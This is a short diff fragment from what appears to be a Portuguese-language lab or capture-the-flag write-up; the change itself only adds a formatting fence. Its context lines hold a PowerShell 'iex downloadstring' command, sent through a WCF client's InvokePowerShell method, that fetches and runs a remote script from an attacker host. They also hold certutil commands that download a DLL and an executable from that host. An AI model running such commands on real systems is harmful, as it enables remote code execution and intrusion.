@@ -196,7 +196,7 @@ Vamos adicionar nossa linha no código
 Console.WriteLine(client.InvokePowerShell(" iex (new-object net.webclient).downloadstring('http://10.10.14.136/chu.ps1')"));
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 certutil -urlcache -split -f "http://10.10.14.136/WcfRemotingLibrary.dll" WcfRemotingLibrary.dll
 certutil -urlcache -split -f "http://10.10.14.136/WcfClient.exe" WcfClient.exe
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
